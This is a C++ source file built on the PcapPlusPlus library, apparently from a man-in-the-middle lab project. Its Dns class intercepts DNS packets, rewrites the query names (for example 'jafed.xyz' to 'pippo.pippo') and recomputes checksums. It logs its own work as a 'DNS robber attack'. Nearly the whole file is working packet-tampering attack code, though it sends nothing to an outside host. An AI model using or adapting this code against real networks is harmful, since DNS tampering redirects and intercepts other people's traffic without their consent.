#include "fstream"
#include "iostream"
#include "pcapplusplus/DnsLayer.h"
#include "pcapplusplus/EthLayer.h"
#include "pcapplusplus/HttpLayer.h"
#include "pcapplusplus/IPv4Layer.h"
#include "pcapplusplus/Packet.h"
#include "pcapplusplus/PcapFileDevice.h"
#include "pcapplusplus/PcapLiveDeviceList.h"
#include "pcapplusplus/TcpLayer.h"
#include "pcapplusplus/UdpLayer.h"
#include "pcapplusplus/VlanLayer.h"
#include <stdlib.h>
#include <string.h>

using namespace std;
using namespace pcpp;
namespace Action {
class Dns {

public:
    static const int level = 5;
    int n{2};

    Dns(){};
    ~Dns(){};

    void changeRequest(Packet *inPacket) {
        bool hit = false;
        DnsQuery *q;
        DnsLayer *response = inPacket->getLayerOfType<DnsLayer>();
        if (response == NULL || (q = response->getFirstQuery()) == NULL)
            return;
        //DOC: eseguo la sostituzione
        do {
            map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
            for (auto &dnsname : substitutions) {
                if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second)) {
                    cout << "\t>> DNS robber attack is going: " << dnsname.first << " --> " << dnsname.second << endl;
                }
            }
        } while ((q = response->getNextQuery(q)) != NULL);
        inPacket->computeCalculateFields();
        return;
    };

    static bool isProto(Packet *p) {
        return p->getLastLayer()->getProtocol() == pcpp::DNS;
    }
};
} // namespace Action